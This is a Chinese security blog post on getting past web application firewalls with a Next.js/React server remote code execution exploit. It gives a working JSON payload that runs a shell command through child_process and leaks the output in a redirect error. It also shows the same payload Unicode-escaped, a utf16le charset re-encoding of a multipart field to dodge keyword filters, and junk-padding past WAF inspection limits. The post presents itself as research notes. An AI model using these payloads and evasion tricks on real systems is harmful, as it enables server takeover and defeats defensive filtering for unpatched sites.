---
title: "有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析"
source: https://mrxn.net/jswz/nextjs-rce-bypass.html
---

# 有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/8 21:28
* 1525浏览
* [2评论](#comment)
* 46分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 前言

最近Next.js
[RCE](https://mrxn.net/tag/rce)
经历了从
**“核弹”->“跳弹”->“核弹”**
的戏剧性转折，备受关注。

我最近也看到了各种各样的POC、脚本等等，相关poc可以看前一篇文章：
[Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)](https://mrxn.net/jswz/nextjs-rce-cve.html)
。本问主要记录下我根据网上的各种bypass
[waf](https://mrxn.net/tag/waf)
自己摸索的一些简单见解，鉴于本人对JavaScript、Next.js和React这些前端/全栈框架不熟悉，余下所述大体性质以笔记为主，算不得研究，如有错误不当之处，还请斧正。

# 正文

## 初阶bypass

我最开始的bypass waf姿势使用的是大多数在测试Java的fastjson反序列化相关漏洞里用到，使用Unicode编码以及在各个字符集间插入一些特殊的Unicode来达到绕过waf的目的，为此我还专门用AI写了个Unicode编码json的键、值或键值对的小工具
[JSON Unicode 转换器](https://pages.mrxn.net/JSON2Unicode.html)

比如将如下body回显poc的键值对全部使用Unicode编码

```
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/413c743cc2704ac699e14ebf2e9e4aff.webp)

编码后如下

```
{
    "\u0074\u0068\u0065\u006e": "\u0024\u0031\u003a\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f\u003a\u0074\u0068\u0065\u006e",
    "\u0073\u0074\u0061\u0074\u0075\u0073": "\u0072\u0065\u0073\u006f\u006c\u0076\u0065\u0064\u005f\u006d\u006f\u0064\u0065\u006c",
    "\u0072\u0065\u0061\u0073\u006f\u006e": -1,
    "\u0076\u0061\u006c\u0075\u0065": "\u007b\u0022\u0074\u0068\u0065\u006e\u0022\u003a\u0022\u0024\u0042\u0022\u007d",
    "\u005f\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065": {
        "\u005f\u0070\u0072\u0065\u0066\u0069\u0078": "\u0076\u0061\u0072\u0020\u0072\u0065\u0073\u003d\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u002e\u006d\u0061\u0069\u006e\u004d\u006f\u0064\u0075\u006c\u0065\u002e\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0028\u0027\u0063\u0068\u0069\u006c\u0064\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0027\u0029\u002e\u0065\u0078\u0065\u0063\u0053\u0079\u006e\u0063\u0028\u0027\u0069\u0064\u0027\u002c\u007b\u0027\u0074\u0069\u006d\u0065\u006f\u0075\u0074\u0027\u003a\u0035\u0030\u0030\u0030\u007d\u0029\u002e\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0027\u0062\u0061\u0073\u0065\u0036\u0034\u0027\u0029\u003b\u0074\u0068\u0072\u006f\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u002e\u0061\u0073\u0073\u0069\u0067\u006e\u0028\u006e\u0065\u0077\u0020\u0045\u0072\u0072\u006f\u0072\u0028\u0027\u004e\u0045\u0058\u0054\u005f\u0052\u0045\u0044\u0049\u0052\u0045\u0043\u0054\u0027\u0029\u002c\u0020\u007b\u0064\u0069\u0067\u0065\u0073\u0074\u003a\u0060\u0024\u007b\u0072\u0065\u0073\u007d\u0060\u007d\u0029\u003b",
        "\u005f\u0063\u0068\u0075\u006e\u006b\u0073": "\u0024\u0051\u0032",
        "\u005f\u0066\u006f\u0072\u006d\u0044\u0061\u0074\u0061": {
            "\u0067\u0065\u0074": "\u0024\u0031\u003a\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072\u003a\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"
        }
    }
}
```

最开始这样是可以
[绕过](https://mrxn.net/tag/%E7%BB%95%E8%BF%87)
一些初阶waf的，但是对于一些厉害的waf是不行的。

## 中阶bypass

这是在x上看到P牛的推文，在感叹痛失5W$赏金的截图里发现的！使用
**特殊编码**
来绕过
[waf](https://mrxn.net/tag/waf)
对关键字的拦截，P牛依旧是那个P牛！

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/c6867c2e4f1648b7967084fd86affe54.webp)

如上图所示，P牛将
`"$1:constructor:constructor"`
部分摘出来，单独使用
**utf16le**
进行编码

> 这里使用CyberChef与yakit的fuzztag组合方便快速编解码

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/c967fc574df241478ad6b005c0ce69ce.webp)

```
Content-Disposition: form-data; name="3"
Content-Type: text/plain; charset=utf16le

{{hexd(2200240031003a0063006f006e007300740072007500630074006f0072003a0063006f006e007300740072007500630074006f0072002200)}}
```

亦或将整体全部进行utf16le编码都是可以的

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/fb9247f5b56741788763b9b81a32c65e.webp)

编码后使用yakit进行hex解码发送

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/0e4d1b22c7bd4a42b021e123b661aa6c.webp)

同样是可以得到id命令执行的结果的，同时可见图中的
`charset=ucs2`
，其实utf16be、ucs2等编码代号（UTF-16与UCS-2味同一个编码类型）都是同一个编码。

chaset的多种写法如 utf16le、utf-16le 或者 ucs2、ucs-2 这些写法都是支持的。

要理解这种编码方式，首先，需要明确一个概念：
**React**
是前端库，不负责解析 HTTP 请求体；Next.js（作为全栈框架）的服务端部分（
**API Routes**
或
**Route Handlers**
）才负责解析这些数据。

那为什么支持这些编码方式呢？那里可以查看支持的编码列表呢？通过搜索找到了
**Node.js**
和
**mdn**
官方介绍。

在 Next.js 环境中，处理编码的核心依赖于以下两个标准：

#### **A. Node.js** `Buffer` **和** `iconv-lite` **(底层支持)**

Next.js 运行在 Node.js 上时，原生支持的编码非常有限。

* **官方文档**
  :
  [Node.js Buffer Encodings](https://nodejs.org/api/buffer.html#buffers-and-character-encodings)
* **原生支持**
  :
  `utf8`
  ,
  `utf16le`
  (即 UCS-2),
  `latin1`
  ,
  `base64`
  ,
  `hex`
  ,
  `ascii`
  .
* **扩展支持**
  : 如果你需要处理 GBK, Big5 等，通常社区标准是使用
  `iconv-lite`
  库，但这需要你手动引入。

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/e259e7605f3a466fa78f89ca451bc99c.webp)

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/f09f716370aa4dd79e145c9d1383f5b5.webp)

#### **B. Web Standard** `TextDecoder` **(App** **Router** **标准)**

在 Next.js App Router (使用
`Request`
/
`Response`
API) 中，底层依赖 Web 标准 API。

* **官方文档**
  :
  [MDN TextDecoder Encodings](https://developer.mozilla.org/en-US/docs/Web/API/Encoding_API/Encodings)
* **支持列表**
  :
  `utf-8`
  ,
  `utf-16le`
  ,
  `utf-16be`
  ,
  `iso-8859-1`
  ,
  `windows-1252`
  ,
  `gbk`
  ,
  `big5`
  等等。

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/9d743b56d3704b349e609733fb264b82.webp)

## “终极bypass”

大力出奇迹！众所周知，所有直路检测设备都面临一个难题就是性能与检测量的平衡点的博弈，检测量大了，设备扛不住，检测量小了，又容易漏。这事儿赛博菩萨也没办法，为了减小此次漏洞的影响面，Cloudflare为所有用户开启了拦截next.js
[rce](https://mrxn.net/tag/rce)
相关poc的利用，从最开始的128kb大小升级到1M，也是治标不治本啊！

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/4716a11d58834de5ba861639a0366e96.webp)

但是你可以自己手动设置next.js处理包的大小（如果配合其他后端如nginx可能支持超过此设置）

![有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://image.mrxn.net/3e458463421d42de919098b890b45f96.webp)

然而此次漏洞是
`multipart/form-data`
格式的利用，可以填充大量垃圾字符，直到达到
[waf](https://mrxn.net/tag/waf)
预设的临界值，但是没有超过后端的上传上限，此时就可以配合前面的编码方式甚至不需要编码绕过waf。

以及其他如分块传输、分块延时、随机延时传输、新的反射调用链等等等。

# 参考

* <https://www.cnblogs.com/malecrab/p/5300503.html>
* <https://x.com/phithon_xg/status/1997005756013728204>
* <https://x.com/pyn3rd/status/1996788502386909539>

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  waf](https://mrxn.net/tag/waf)
* [#
  cve](https://mrxn.net/tag/cve)
* [#
  绕过](https://mrxn.net/tag/%E7%BB%95%E8%BF%87)
* [#
  JavaScript](https://mrxn.net/tag/JavaScript)
* [#
  rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://mrxn.net/jswz/nextjs-rce-bypass.html)
  
文章链接：
<https://mrxn.net/jswz/nextjs-rce-bypass.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/nextjs-rce-bypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/nextjs-rce-bypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});